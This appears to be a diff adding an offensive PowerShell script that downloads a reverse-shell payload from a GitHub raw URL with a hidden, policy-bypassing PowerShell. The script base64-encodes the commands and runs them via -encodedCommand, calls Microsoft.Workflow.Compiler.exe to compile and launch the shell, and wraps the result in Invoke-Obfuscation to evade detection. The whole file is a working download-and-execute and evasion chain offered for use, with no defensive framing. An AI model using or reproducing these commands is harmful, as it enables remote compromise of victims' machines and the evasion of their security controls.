@@ -1,0 +1,29 @@
+##Declare .txt file / in memory variable
+$script="powershell -ExecutionPolicy Bypass -WindowStyle Hidden -command {(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/marq36/rev.shell/master/rev.shell', '.\Rev.Shell')}"
+##encode/encrypt .txt file / in memory variable
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+$encScript = [Convert]::ToBase64String($bytes)
+##Execute GET .txt file
+powershell.exe -encodedCommand $encScript
+
+#Declare .shell file / in memory variable
+$script="powershell -ExecutionPolicy Bypass -WindowStyle Hidden -command {(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/marq36/rev.shell/master/rev.shell', '.\Rev.Shell')}"
+##encode/encrypt .txt file / in memory variable
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+$encScript = [Convert]::ToBase64String($bytes)
+##Execute GET .shell file
+powershell.exe -encodedCommand $encScript
+
+#Declare compiler / in memory variable
+$script="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell"
+##encode/encrypt compiler / in memory variable
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+$encScript = [Convert]::ToBase64String($bytes)
+##Grap the string
+$encScript
+QwA6AFwAVwBpAG4AZABvAHcAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AC4ATgBlAHQAXABGAHIAYQBtAGUAdwBvAHIAawA2ADQAXAB2ADQALgAwAC4AMwAwADMAMQA5AFwATQBpAGMAcgBvAHMAbwBmAHQALgBXAG8AcgBrAGYAbABvAHcALgBDAG8AbQBwAGkAbABlAHIALgBlAHgAZQAgAFIARQBWAC4AdAB4AHQAIABSAGUAdgAuAFMAaABlAGwAbAA=
+
+#Write Invoke-Obfuscation.psd1 to CLI
+...
+##set arguments, run the encoded command and set options
+>>Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -ScriptBlock {Write-Host 'This shit works!' -ForegroundColor Green; powershell.exe -encodedCommand QwA6AFwAVwBpAG4AZABvAHcAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AC4ATgBlAHQAXABGAHIAYQBtAGUAdwBvAHIAawA2ADQAXAB2ADQALgAwAC4AMwAwADMAMQA5AFwATQBpAGMAcgBvAHMAbwBmAHQALgBXAG8AcgBrAGYAbABvAHcALgBDAG8AbQBwAGkAbABlAHIALgBlAHgAZQAgAFIARQBWAC4AdAB4AHQAIABSAGUAdgAuAFMAaABlAGwAbAA=}
